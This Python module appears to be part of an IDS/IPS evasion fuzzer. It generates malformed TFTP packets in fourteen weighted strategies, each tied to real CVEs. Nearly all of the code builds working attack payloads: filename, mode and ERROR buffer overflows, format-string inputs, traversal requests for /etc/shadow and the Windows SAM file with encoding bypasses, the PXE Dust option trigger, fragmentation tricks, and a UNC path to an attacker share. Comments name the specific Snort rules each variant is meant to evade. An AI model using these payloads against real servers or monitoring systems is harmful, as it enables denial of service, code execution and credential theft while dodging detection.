"""
TFTP protocol mutation strategies for IDS/IPS evasion fuzzing.

Grounded in:
  - RFC 1350  (TFTP Protocol Revision 2 — base standard, STD 33)
  - RFC 2347  (TFTP Option Extension)
  - RFC 2348  (TFTP Blocksize Option, valid 8–65464)
  - RFC 2349  (TFTP Timeout Interval and Transfer Size Options)
  - RFC 7440  (TFTP Windowsize Option)
  - RFC 2090  (TFTP Multicast Option — Experimental)
  - CVE-2002-0813  (Cisco IOS TFTP GET filename overflow >100 bytes)
  - CVE-2003-0380  (AT-TFTP PUT filename overflow)
  - CVE-2006-6184  (AT-TFTP 1.9 stack overflow via long GET/PUT)
  - CVE-2006-4948  (Multiple TFTP filename overflow)
  - CVE-2008-1611  (TFTP Server filename overflow)
  - CVE-2008-2161  (Open TFTP Server heap overflow via long ERROR)
  - CVE-2008-4441  (Tftpd32 malformed packet crash)
  - CVE-2009-0271  (SolarWinds TFTP "..../" collapse → traversal)
  - CVE-2010-2115  (SolarWinds TFTP crafted netascii read DoS)
  - CVE-2010-4323  (Tellurian TftpNT long filename → RCE)
  - CVE-2018-8476  (Windows WDS TFTP UAF via blksize+windowsize — PXE Dust)
  - CVE-2018-10387 (Open TFTP Server 1.66 heap overflow via ERROR)
  - CVE-2019-12567 (Open TFTP Server 1.66 stack overflow in logMess)
  - CVE-2021-44428 (Serva 4.4.0 stack buffer overflow via long RRQ)
  - CVE-2021-44429 (Pinkie 2.15 remote buffer overflow via long RRQ)
  - CVE-1999-0183  (Generic TFTP "../" directory traversal)
  - CVE-2007-3948  (SolarWinds TFTP NULL opcode crash)
  - Snort TFTP rules: SID 518/519/520/1289/1441-1444/1941/2337/2339/18767/32637
  - Metasploit 3Com TFTP Fuzzer (mode string overflow)
  - nullsecurity tftp-fuzz (opcode+char+command matrix)
  - CheckPoint PXE Dust boofuzz TFTP fuzzer (option field fuzzing)
  - PixieFail (CVE-2023-45229–45237 — EDK II UEFI PXE/TFTP stack)

Transport: UDP port 69.  Binary protocol with 2-byte opcode header.
Lock-step protocol: each DATA must be ACKed before next is sent.
No authentication, no encryption, no directory listing.

Key protocol concepts:
  - Opcodes: RRQ(1), WRQ(2), DATA(3), ACK(4), ERROR(5), OACK(6)
  - RRQ/WRQ: opcode + filename\\0 + mode\\0 [+ opt\\0 + val\\0 ...]
  - DATA: opcode + block#(2 bytes) + data(0..blocksize)
  - ACK: opcode + block#(2 bytes)
  - ERROR: opcode + errcode(2 bytes) + errmsg\\0
  - OACK: opcode + [opt\\0 + val\\0 ...]
  - Modes: "netascii" (7-bit NVT), "octet" (raw 8-bit), "mail" (obsolete)
  - Options: blksize(8–65464), tsize, timeout(1–255), windowsize(1–65535)
  - Transfer IDs: random source ports used as TIDs after initial RRQ/WRQ
  - Block# = 16-bit unsigned (1–65535); rollover at 65535 is implementation-defined
  - Sorcerer's Apprentice Syndrome: duplicate ACK retransmission loop bug
  - Default blocksize: 512; last DATA < blocksize signals end of transfer
"""

import os
import random
import struct

# ── TFTP Constants ────────────────────────────────────────────────────────

_TFTP_PORT = 69

# Opcodes (network byte order, 2 bytes each)
_OP_RRQ   = b'\x00\x01'
_OP_WRQ   = b'\x00\x02'
_OP_DATA  = b'\x00\x03'
_OP_ACK   = b'\x00\x04'
_OP_ERROR = b'\x00\x05'
_OP_OACK  = b'\x00\x06'

# Standard error codes
_ERR_UNDEFINED    = 0
_ERR_FILE_NOT_FOUND = 1
_ERR_ACCESS_VIOLATION = 2
_ERR_DISK_FULL    = 3
_ERR_ILLEGAL_OP   = 4
_ERR_UNKNOWN_TID  = 5
_ERR_FILE_EXISTS  = 6
_ERR_NO_SUCH_USER = 7
_ERR_OPTION_FAIL  = 8

# Protocol limits
_DEFAULT_BLOCKSIZE = 512
_MAX_BLOCKSIZE     = 65464
_MAX_BLOCK_NUM     = 0xFFFF

# Common modes
_MODE_OCTET    = b"octet"
_MODE_NETASCII = b"netascii"

# ── Helpers ───────────────────────────────────────────────────────────────

def _rrq(filename, mode=_MODE_OCTET, options=None):
    """Build a standard RRQ packet."""
    pkt = _OP_RRQ + filename + b'\x00' + mode + b'\x00'
    if options:
        for k, v in options:
            pkt += k + b'\x00' + v + b'\x00'
    return pkt


def _wrq(filename, mode=_MODE_OCTET, options=None):
    """Build a standard WRQ packet."""
    pkt = _OP_WRQ + filename + b'\x00' + mode + b'\x00'
    if options:
        for k, v in options:
            pkt += k + b'\x00' + v + b'\x00'
    return pkt


def _rand_char():
    """Return a random single byte for padding."""
    return bytes([random.randint(0x41, 0x5A)])


# ── Strategy 1: rrq_filename_overflow ─────────────────────────────────────

def _strat_rrq_filename_overflow():
    """RRQ with oversized filename to trigger buffer overflows.

    CVE-2002-0813, CVE-2006-6184, CVE-2006-4948, CVE-2021-44428/44429.
    Snort SID 1941 checks >100 bytes without NUL — we include boundary
    evasion variants (NUL at byte 99, non-ASCII chars, format strings).
    """
    v = random.randint(0, 6)
    if v == 0:
        # Classic overflow: "A" × large_size, valid mode after
        sz = random.choice([200, 500, 1000, 4096, 10000, 32768, 65000])
        fname = b"A" * sz
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 1:
        # Non-ASCII overflow (charset confusion)
        sz = random.randint(200, 5000)
        fname = bytes([random.randint(0x80, 0xFF) for _ in range(sz)])
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 2:
        # SID 1941 boundary evasion: NUL at byte 99 then continue overflow
        fname = b"A" * 99 + b'\x00' + b"B" * random.randint(500, 5000)
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 3:
        # Format string specifiers (targets printf-style logging)
        fname = b"%n%s%x%p" * random.randint(50, 400)
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 4:
        # No NUL terminator at all — no mode field
        sz = random.randint(500, 10000)
        fname = b"A" * sz
        return _OP_RRQ + fname
    elif v == 5:
        # Long filename with embedded path separators
        fname = (b"/" + b"A" * 50) * random.randint(10, 100)
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    else:
        # All 0xFF bytes (maximum byte value)
        sz = random.randint(200, 5000)
        fname = b'\xFF' * sz
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'


# ── Strategy 2: wrq_filename_overflow ─────────────────────────────────────

def _strat_wrq_filename_overflow():
    """WRQ with oversized filename — same attack surface as RRQ but opcode 2.

    CVE-2003-0380, CVE-2008-1611, CVE-2003-0729.
    Snort SID 2337 checks \\x00\\x02 + isdataat:100.
    """
    v = random.randint(0, 6)
    if v == 0:
        sz = random.choice([200, 500, 1000, 4096, 10000, 32768, 65000])
        fname = b"A" * sz
        return _OP_WRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 1:
        sz = random.randint(200, 5000)
        fname = bytes([random.randint(0x80, 0xFF) for _ in range(sz)])
        return _OP_WRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 2:
        # SID 2337 boundary evasion: NUL at byte 99
        fname = b"A" * 99 + b'\x00' + b"B" * random.randint(500, 5000)
        return _OP_WRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 3:
        fname = b"%n%s%x%p" * random.randint(50, 400)
        return _OP_WRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 4:
        sz = random.randint(500, 10000)
        return _OP_WRQ + b"A" * sz
    elif v == 5:
        fname = (b"\\" + b"A" * 50) * random.randint(10, 100)
        return _OP_WRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    else:
        sz = random.randint(200, 5000)
        fname = b'\xFF' * sz
        return _OP_WRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'


# ── Strategy 3: directory_traversal_injection ─────────────────────────────

def _strat_directory_traversal_injection():
    """Path traversal sequences in RRQ/WRQ filenames with encoding bypass.

    CVE-1999-0183, CVE-2002-1209, CVE-2009-0271 (SolarWinds "..../" collapse).
    Snort SID 519 checks ".." at offset 2, SID 520 checks absolute path.
    Evasion: URL-encoded, overlong UTF-8, backslash, mangled, NUL byte.
    """
    targets_unix = [
        b"../../../etc/passwd",
        b"../../../etc/shadow",
        b"../../../etc/hosts",
        b"../../../boot/grub/grub.cfg",
    ]
    targets_win = [
        b"..\\..\\..\\windows\\win.ini",
        b"..\\..\\..\\windows\\system32\\config\\sam",
        b"..\\..\\..\\boot.ini",
    ]
    target = random.choice(targets_unix + targets_win)
    v = random.randint(0, 8)
    if v == 0:
        # Plain traversal
        fname = target
    elif v == 1:
        # URL-encoded dots and slashes
        fname = target.replace(b"..", b"%2e%2e").replace(b"/", b"%2f").replace(b"\\", b"%5c")
    elif v == 2:
        # Overlong UTF-8 encoding of dots and slashes
        fname = target.replace(b"..", b"%c0%ae%c0%ae").replace(b"/", b"%c0%af")
    elif v == 3:
        # SolarWinds collapse: "..../" → "../" after filter
        fname = target.replace(b"../", b"....//").replace(b"..\\", b"....\\\\")
    elif v == 4:
        # NUL byte truncation: append safe extension
        fname = target + b"%00.wim"
    elif v == 5:
        # Mixed encoding
        fname = target.replace(b"../", b"..%2f")
    elif v == 6:
        # Absolute path (SID 520 target)
        fname = b"/" + target.lstrip(b"./\\")
    elif v == 7:
        # Double traversal mangling
        fname = target.replace(b"../", b"..././")
    else:
        # All backslash
        fname = target.replace(b"/", b"\\")

    opcode = random.choice([_OP_RRQ, _OP_WRQ])
    return opcode + fname + b'\x00' + _MODE_OCTET + b'\x00'


# ── Strategy 4: error_packet_overflow ─────────────────────────────────────

def _strat_error_packet_overflow():
    """ERROR packets with oversized ErrMsg string.

    CVE-2008-2161 (heap overflow), CVE-2018-10387 (heap), CVE-2019-12567
    (stack overflow in logMess).  NO Snort TFTP rule covers ERROR overflow.
    """
    v = random.randint(0, 6)
    errcode = struct.pack(">H", random.randint(0, 8))
    if v == 0:
        # Giant error message
        msg = b"A" * random.choice([1000, 5000, 10000, 32768])
        return _OP_ERROR + errcode + msg + b'\x00'
    elif v == 1:
        # Missing NUL terminator
        msg = b"A" * random.randint(500, 5000)
        return _OP_ERROR + errcode + msg
    elif v == 2:
        # Format string in error message
        msg = b"%n%s%x%p" * random.randint(100, 500)
        return _OP_ERROR + errcode + msg + b'\x00'
    elif v == 3:
        # Non-ASCII error message
        msg = bytes([random.randint(0x80, 0xFF) for _ in range(random.randint(500, 5000))])
        return _OP_ERROR + errcode + msg + b'\x00'
    elif v == 4:
        # Invalid error code > 8 (undefined)
        errcode = struct.pack(">H", random.randint(9, 65535))
        msg = b"X" * random.randint(100, 2000)
        return _OP_ERROR + errcode + msg + b'\x00'
    elif v == 5:
        # Error code with zero-length message
        return _OP_ERROR + errcode + b'\x00'
    else:
        # Embedded NUL bytes in message
        msg = b"error" + b'\x00' * 50 + b"overflow" * 100
        return _OP_ERROR + errcode + msg + b'\x00'


# ── Strategy 5: opcode_abuse ─────────────────────────────────────────────

def _strat_opcode_abuse():
    """Invalid or unexpected opcodes to test error handling paths.

    CVE-2007-3948 (NULL opcode crash), BugTraq 7575.
    Snort SID 2339 catches \\x00\\x00 only — opcodes 7–255 undetected.
    """
    v = random.randint(0, 6)
    if v == 0:
        # NULL opcode (CVE-2007-3948)
        return b'\x00\x00' + b'test.txt' + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 1:
        # Undefined opcodes 7–255
        op = struct.pack(">H", random.randint(7, 255))
        return op + os.urandom(random.randint(10, 500))
    elif v == 2:
        # Maximum opcode 0xFFFF
        return b'\xFF\xFF' + os.urandom(random.randint(10, 200))
    elif v == 3:
        # Single byte (truncated opcode)
        return bytes([random.randint(0, 255)])
    elif v == 4:
        # Valid opcode + completely random body
        op = random.choice([_OP_RRQ, _OP_WRQ, _OP_DATA, _OP_ACK, _OP_ERROR, _OP_OACK])
        return op + os.urandom(random.randint(100, 1000))
    elif v == 5:
        # Unsolicited OACK to port 69 (no prior request)
        return _OP_OACK + b'blksize' + b'\x00' + b'512' + b'\x00'
    else:
        # Three-byte opcode (extra padding before payload)
        return b'\x00\x01\x00' + b'test' + b'\x00' + _MODE_OCTET + b'\x00'


# ── Strategy 6: option_negotiation_abuse ──────────────────────────────────

def _strat_option_negotiation_abuse():
    """Malformed option extensions in RRQ/WRQ per RFC 2347/2348/2349/7440.

    CVE-2018-8476 (Windows WDS TFTP UAF via blksize+windowsize — PXE Dust).
    NO Snort rule inspects TFTP option fields — complete blind spot.
    """
    fname = b"boot.wim"
    v = random.randint(0, 8)
    if v == 0:
        # blksize=0 (potential divide-by-zero)
        return _rrq(fname, options=[(b"blksize", b"0")])
    elif v == 1:
        # blksize exceeds RFC max 65464
        return _rrq(fname, options=[(b"blksize", b"65535")])
    elif v == 2:
        # tsize integer overflow (32/64-bit)
        return _rrq(fname, options=[(b"tsize", b"99999999999999999")])
    elif v == 3:
        # windowsize=0 (invalid per RFC 7440) or extreme 65535
        ws = random.choice([b"0", b"65535"])
        return _rrq(fname, options=[(b"windowsize", ws)])
    elif v == 4:
        # Many options exceeding 512-byte max request
        opts = [(f"opt{i}".encode(), b"A" * 50) for i in range(20)]
        return _rrq(fname, options=opts)
    elif v == 5:
        # Missing NUL between option key and value
        pkt = _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
        pkt += b'blksize' + b'1024' + b'\x00'
        return pkt
    elif v == 6:
        # PXE Dust trigger: blksize + windowsize combination (CVE-2018-8476)
        return _rrq(fname, options=[
            (b"blksize", b"1456"),
            (b"windowsize", b"64"),
            (b"tsize", b"0"),
            (b"msftwindow", b"31416"),
        ])
    elif v == 7:
        # Duplicate options (server behavior undefined)
        return _rrq(fname, options=[
            (b"blksize", b"512"),
            (b"blksize", b"1024"),
            (b"blksize", b"65535"),
        ])
    else:
        # Unknown option names with long values
        opts = [(b"unknownopt", b"X" * random.randint(200, 2000))]
        return _rrq(fname, options=opts)


# ── Strategy 7: mode_string_abuse ─────────────────────────────────────────

def _strat_mode_string_abuse():
    """Mutated transfer mode field in RRQ/WRQ packets.

    Metasploit 3Com TFTP Fuzzer crash via long mode string (OffSec).
    Snort rules check opcode and filename but NOT mode content — blind spot.
    """
    fname = b"test.txt"
    v = random.randint(0, 6)
    if v == 0:
        # Oversized mode (Metasploit 3Com pattern)
        mode = b"A" * random.choice([500, 1000, 2000, 5000])
        return _OP_RRQ + fname + b'\x00' + mode + b'\x00'
    elif v == 1:
        # Unknown/obsolete modes
        mode = random.choice([b"binary", b"foobar", b"MAIL", b"ascii", b"raw"])
        return _OP_RRQ + fname + b'\x00' + mode + b'\x00'
    elif v == 2:
        # Empty mode (two consecutive NULs)
        return _OP_RRQ + fname + b'\x00' + b'\x00'
    elif v == 3:
        # Missing NUL after mode
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET
    elif v == 4:
        # Embedded NUL in mode string
        mode = b"net\x00ascii"
        return _OP_RRQ + fname + b'\x00' + mode + b'\x00'
    elif v == 5:
        # Non-ASCII mode bytes
        mode = bytes([random.randint(0x80, 0xFF) for _ in range(random.randint(10, 500))])
        return _OP_RRQ + fname + b'\x00' + mode + b'\x00'
    else:
        # Case variation (RFC says case-insensitive)
        mode = random.choice([b"NETASCII", b"OcTeT", b"NetAscii", b"OCTET", b"Octet"])
        return _OP_RRQ + fname + b'\x00' + mode + b'\x00'


# ── Strategy 8: block_number_manipulation ─────────────────────────────────

def _strat_block_number_manipulation():
    """Manipulated block numbers in DATA/ACK to confuse transfer state.

    Tests block# boundary (0, 0xFFFF rollover), Sorcerer's Apprentice
    duplicate ACK bug, oversized DATA payload, and out-of-sequence ACKs.
    """
    v = random.randint(0, 6)
    if v == 0:
        # DATA with block# = 0 (invalid for DATA, only for WRQ ACK)
        data = os.urandom(_DEFAULT_BLOCKSIZE)
        return _OP_DATA + struct.pack(">H", 0) + data
    elif v == 1:
        # DATA with block# = 0xFFFF (rollover boundary)
        data = os.urandom(_DEFAULT_BLOCKSIZE)
        return _OP_DATA + struct.pack(">H", 0xFFFF) + data
    elif v == 2:
        # ACK for block# = 0xFFFF
        return _OP_ACK + struct.pack(">H", 0xFFFF)
    elif v == 3:
        # ACK for future block (never sent — confuse server)
        return _OP_ACK + struct.pack(">H", random.randint(100, 60000))
    elif v == 4:
        # Duplicate ACKs concatenated (Sorcerer's Apprentice trigger)
        blk = struct.pack(">H", random.randint(1, 100))
        return _OP_ACK + blk + _OP_ACK + blk
    elif v == 5:
        # DATA with oversized payload (> default blocksize)
        data = os.urandom(random.choice([1000, 2000, 4096, 8192]))
        return _OP_DATA + struct.pack(">H", 1) + data
    else:
        # ACK with extra trailing data (should be exactly 4 bytes)
        return _OP_ACK + struct.pack(">H", 0) + os.urandom(random.randint(100, 1000))


# ── Strategy 9: malformed_packet_structure ────────────────────────────────

def _strat_malformed_packet_structure():
    """Structurally invalid TFTP packets — truncated, oversized, missing fields.

    CVE-2008-4441 (Tftpd32 malformed packet crash).
    Tests parser robustness against packets that violate RFC 1350 structure.
    """
    v = random.randint(0, 7)
    if v == 0:
        # Empty UDP payload (0 bytes)
        return b'\x00'
    elif v == 1:
        # Single random byte
        return bytes([random.randint(0, 255)])
    elif v == 2:
        # Opcode only (2 bytes, no payload)
        return random.choice([_OP_RRQ, _OP_WRQ, _OP_DATA, _OP_ACK, _OP_ERROR])
    elif v == 3:
        # RRQ with no filename (immediate NUL after opcode)
        return _OP_RRQ + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 4:
        # RRQ with filename but no mode field
        return _OP_RRQ + b'test.txt' + b'\x00'
    elif v == 5:
        # DATA with no block number (opcode + raw data)
        return _OP_DATA + os.urandom(_DEFAULT_BLOCKSIZE)
    elif v == 6:
        # Giant payload near 64KB UDP limit
        return _OP_RRQ + os.urandom(65000)
    else:
        # All-NUL packet of various sizes
        return b'\x00' * random.choice([4, 10, 100, 512, 1000])


# ── Strategy 10: ip_fragmentation_evasion ─────────────────────────────────

def _strat_ip_fragmentation_evasion():
    """Oversized TFTP payloads designed to force IP-layer fragmentation.

    When UDP payload exceeds MTU (~1500), the IP layer fragments it.
    Snort may not reassemble fragments before signature matching.
    Malicious content is positioned to fall in later fragments.
    """
    v = random.randint(0, 5)
    if v == 0:
        # RRQ padded to exceed MTU — traversal filename in second fragment
        padding = b"A" * 1400
        fname = padding + b"../../../etc/passwd"
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 1:
        # NOP padding pushes filename into second fragment region
        fname = b"\x00" * 1460 + b"../../../etc/shadow"
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    elif v == 2:
        # Oversized DATA forcing multi-fragment delivery
        data = os.urandom(random.choice([2000, 4000, 8000, 16000]))
        return _OP_DATA + struct.pack(">H", 1) + data
    elif v == 3:
        # Many options filling multiple fragments
        opts = [(f"opt{i}".encode(), b"X" * 100) for i in range(50)]
        return _rrq(b"boot.wim", options=opts)
    elif v == 4:
        # 8-byte NOP blocks designed for fragment boundaries
        fname = (b"\x90" * 8 + b"A") * 200
        return _OP_RRQ + fname + b'\x00' + _MODE_OCTET + b'\x00'
    else:
        # Near maximum UDP payload
        return _OP_RRQ + os.urandom(min(65500, random.randint(30000, 65500))) + b'\x00' + _MODE_OCTET + b'\x00'


# ── Strategy 11: multicast_option_abuse ───────────────────────────────────

def _strat_multicast_option_abuse():
    """Malformed multicast options per RFC 2090 (Experimental).

    Tests parsing of "addr,port,mc" format with invalid values.
    Most servers don't implement RFC 2090 — malformed values may crash parsers.
    """
    fname = b"pxelinux.0"
    v = random.randint(0, 6)
    if v == 0:
        # Invalid multicast IP address
        return _rrq(fname, options=[(b"multicast", b"999.999.999.999,1758,1")])
    elif v == 1:
        # Port > 65535
        return _rrq(fname, options=[(b"multicast", b"224.1.1.1,99999,1")])
    elif v == 2:
        # Invalid master client flag (not 0 or 1)
        return _rrq(fname, options=[(b"multicast", b"224.1.1.1,1758,2")])
    elif v == 3:
        # Empty multicast value
        return _rrq(fname, options=[(b"multicast", b"")])
    elif v == 4:
        # Overflow in address field
        return _rrq(fname, options=[(b"multicast", b"A" * 5000 + b",1758,1")])
    elif v == 5:
        # Missing comma delimiters
        return _rrq(fname, options=[(b"multicast", b"224.1.1.1")])
    else:
        # Non-numeric port
        return _rrq(fname, options=[(b"multicast", b"224.1.1.1,AAAA,1")])


# ── Strategy 12: unsolicited_response_injection ──────────────────────────

def _strat_unsolicited_response_injection():
    """Server-side packet types sent to port 69 where only RRQ/WRQ are expected.

    Tests undefined behavior when DATA/ACK/OACK/ERROR arrive on the
    listening port without a prior request establishing a transfer.
    """
    v = random.randint(0, 5)
    if v == 0:
        # OACK with options to port 69 (unsolicited)
        return (_OP_OACK + b'blksize' + b'\x00' + b'1024' + b'\x00'
                + b'tsize' + b'\x00' + b'0' + b'\x00')
    elif v == 1:
        # DATA block#1 with payload to port 69
        return _OP_DATA + struct.pack(">H", 1) + os.urandom(_DEFAULT_BLOCKSIZE)
    elif v == 2:
        # ACK block#0 (mimics WRQ acknowledgment)
        return _OP_ACK + struct.pack(">H", 0)
    elif v == 3:
        # ERROR with crafted message
        return _OP_ERROR + struct.pack(">H", 0) + b"Injected error message" + b'\x00'
    elif v == 4:
        # DATA block#0 (should never exist in normal transfer)
        return _OP_DATA + struct.pack(">H", 0) + os.urandom(_DEFAULT_BLOCKSIZE)
    else:
        # OACK with extreme option values
        return _OP_OACK + b'windowsize' + b'\x00' + b'65535' + b'\x00'


# ── Strategy 13: tid_spoofing_confusion ───────────────────────────────────

def _strat_tid_spoofing_confusion():
    """Transfer ID confusion — sends session-like packets to port 69.

    Per RFC 1350, after RRQ to port 69, server responds from new TID.
    These packets simulate TID mismatch or session hijack attempts.
    """
    v = random.randint(0, 5)
    if v == 0:
        # ACK with random block# to port 69 (session hijack attempt)
        return _OP_ACK + struct.pack(">H", random.randint(1, 100))
    elif v == 1:
        # Multiple RRQs for same file in one UDP datagram
        rrq = _OP_RRQ + b'config.cfg' + b'\x00' + _MODE_OCTET + b'\x00'
        return rrq * random.randint(2, 10)
    elif v == 2:
        # DATA response sent to port 69 (simulates server→server confusion)
        return _OP_DATA + struct.pack(">H", 1) + b"username root privilege 15\n"
    elif v == 3:
        # RRQ then ERROR in same datagram (confuse parser boundary)
        rrq = _OP_RRQ + b'test' + b'\x00' + _MODE_OCTET + b'\x00'
        err = _OP_ERROR + struct.pack(">H", 5) + b"Bad TID" + b'\x00'
        return rrq + err
    elif v == 4:
        # ACK with appended option-like data (non-standard)
        return _OP_ACK + struct.pack(">H", 0) + b'\x00' + b'tid' + b'\x00' + b'12345' + b'\x00'
    else:
        # Multiple RRQs for different files concatenated
        files = [b"boot.wim", b"config.cfg", b"passwd", b"firmware.bin"]
        pkt = b""
        for f in files:
            pkt += _OP_RRQ + f + b'\x00' + _MODE_OCTET + b'\x00'
        return pkt


# ── Strategy 14: pxe_boot_payload_injection ───────────────────────────────

def _strat_pxe_boot_payload_injection():
    """PXE/WDS-specific RRQ packets with dangerous option combinations.

    CVE-2018-8476 (Windows WDS TFTP UAF — critical, all Windows Server ≥2008SP2).
    PixieFail CVE-2023-45229–45237 (EDK II UEFI PXE stack).
    CheckPoint PXE Dust: blksize=1456 + windowsize=64 → cache block exhaustion.
    """
    pxe_files = [
        b"boot\\x64\\Images\\boot.wim",
        b"pxelinux.0",
        b"lpxelinux.0",
        b"grub\\x64.efi",
        b"boot\\x86\\wdsnbp.com",
        b"\\Boot\\BCD",
    ]
    fname = random.choice(pxe_files)
    v = random.randint(0, 5)
    if v == 0:
        # PXE Dust trigger: standard option combination (CVE-2018-8476)
        return _rrq(fname, options=[
            (b"blksize", b"1456"),
            (b"windowsize", b"64"),
            (b"tsize", b"0"),
        ])
    elif v == 1:
        # Extreme windowsize (memory exhaustion)
        return _rrq(fname, options=[
            (b"blksize", b"65464"),
            (b"windowsize", b"65535"),
        ])
    elif v == 2:
        # msftwindow (Microsoft-specific, non-standard option)
        return _rrq(fname, options=[
            (b"blksize", b"1456"),
            (b"windowsize", b"4"),
            (b"msftwindow", b"31416"),
            (b"timeout", b"1"),
        ])
    elif v == 3:
        # UNC path injection
        return _rrq(b"\\\\attacker\\share\\payload.exe", options=[
            (b"tsize", b"0"),
        ])
    elif v == 4:
        # blksize × windowsize > available cache (CVE-2018-8476 logic)
        blk = str(random.choice([4096, 8192, 16384, 32768, 65464])).encode()
        win = str(random.choice([16, 32, 64, 128, 256, 65535])).encode()
        return _rrq(fname, options=[
            (b"blksize", blk),
            (b"windowsize", win),
        ])
    else:
        # PXE path with directory traversal + options
        fname = b"boot\\..\\..\\..\\windows\\system32\\config\\sam"
        return _rrq(fname, options=[
            (b"blksize", b"512"),
            (b"tsize", b"0"),
        ])


# ── Strategy Registry ────────────────────────────────────────────────────

TFTP_STRATEGIES = [
    "rrq_filename_overflow",
    "wrq_filename_overflow",
    "directory_traversal_injection",
    "error_packet_overflow",
    "opcode_abuse",
    "option_negotiation_abuse",
    "mode_string_abuse",
    "block_number_manipulation",
    "malformed_packet_structure",
    "ip_fragmentation_evasion",
    "multicast_option_abuse",
    "unsolicited_response_injection",
    "tid_spoofing_confusion",
    "pxe_boot_payload_injection",
]

TFTP_STRATEGY_NAMES = TFTP_STRATEGIES

# Default weights (sum = 100)
TFTP_WEIGHTS = [
    9.0,   # rrq_filename_overflow        (most CVEs, high priority)
    8.5,   # wrq_filename_overflow         (same surface, WRQ-specific CVEs)
    8.5,   # directory_traversal_injection (common, multi-encoding evasion)
    8.0,   # error_packet_overflow         (no Snort coverage, unique attack path)
    6.5,   # opcode_abuse                  (DoS, undefined behavior)
    9.0,   # option_negotiation_abuse      (PXE Dust, modern CVE, no Snort rule)
    7.0,   # mode_string_abuse             (Snort blind spot)
    6.0,   # block_number_manipulation     (state confusion, SAS)
    5.5,   # malformed_packet_structure    (parser robustness)
    7.5,   # ip_fragmentation_evasion      (IDS evasion)
    4.5,   # multicast_option_abuse        (experimental RFC, niche)
    5.5,   # unsolicited_response_injection (undefined behavior)
    6.0,   # tid_spoofing_confusion        (session hijack)
    8.5,   # pxe_boot_payload_injection    (modern CVEs, PXE Dust, PixieFail)
]

TFTP_DEFAULT_WEIGHTS = TFTP_WEIGHTS

TFTP_STRATEGY_LABELS = {
    "rrq_filename_overflow":        "RRQ Filename Overflow",
    "wrq_filename_overflow":        "WRQ Filename Overflow",
    "directory_traversal_injection": "Directory Traversal Injection",
    "error_packet_overflow":        "Error Packet Overflow",
    "opcode_abuse":                 "Opcode Abuse",
    "option_negotiation_abuse":     "Option Negotiation Abuse",
    "mode_string_abuse":            "Mode String Abuse",
    "block_number_manipulation":    "Block Number Manipulation",
    "malformed_packet_structure":   "Malformed Packet Structure",
    "ip_fragmentation_evasion":     "IP Fragmentation Evasion",
    "multicast_option_abuse":       "Multicast Option Abuse",
    "unsolicited_response_injection": "Unsolicited Response Injection",
    "tid_spoofing_confusion":       "TID Spoofing Confusion",
    "pxe_boot_payload_injection":   "PXE Boot Payload Injection",
}

_STRATEGY_FUNCS = {
    "rrq_filename_overflow":        _strat_rrq_filename_overflow,
    "wrq_filename_overflow":        _strat_wrq_filename_overflow,
    "directory_traversal_injection": _strat_directory_traversal_injection,
    "error_packet_overflow":        _strat_error_packet_overflow,
    "opcode_abuse":                 _strat_opcode_abuse,
    "option_negotiation_abuse":     _strat_option_negotiation_abuse,
    "mode_string_abuse":            _strat_mode_string_abuse,
    "block_number_manipulation":    _strat_block_number_manipulation,
    "malformed_packet_structure":   _strat_malformed_packet_structure,
    "ip_fragmentation_evasion":     _strat_ip_fragmentation_evasion,
    "multicast_option_abuse":       _strat_multicast_option_abuse,
    "unsolicited_response_injection": _strat_unsolicited_response_injection,
    "tid_spoofing_confusion":       _strat_tid_spoofing_confusion,
    "pxe_boot_payload_injection":   _strat_pxe_boot_payload_injection,
}


def build_tftp_payload(strategy):
    """Build a TFTP mutation payload for the given strategy.

    Returns (payload_bytes, dst_port).
    """
    func = _STRATEGY_FUNCS.get(strategy)
    if func is None:
        # Fallback: random RRQ
        return _rrq(b"test.txt"), _TFTP_PORT
    payload = func()
    if not payload:
        payload = _rrq(b"test.txt")
    return payload, _TFTP_PORT


# ── Mutator Class ────────────────────────────────────────────────────────

class TftpMutator:
    """TFTP protocol mutator with weighted strategy selection."""

    def __init__(self, external_weights=None, bandit=None):
        self._weights = external_weights or dict(zip(TFTP_STRATEGIES, TFTP_WEIGHTS))
        self._bandit = bandit

    def mutate(self):
        """Return (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._weights)
        else:
            strategies = list(self._weights.keys())
            weights = [max(self._weights.get(s, 1.0), 0.01) for s in strategies]
            strategy = random.choices(strategies, weights=weights, k=1)[0]

        payload, port = build_tftp_payload(strategy)
        return payload, strategy, port
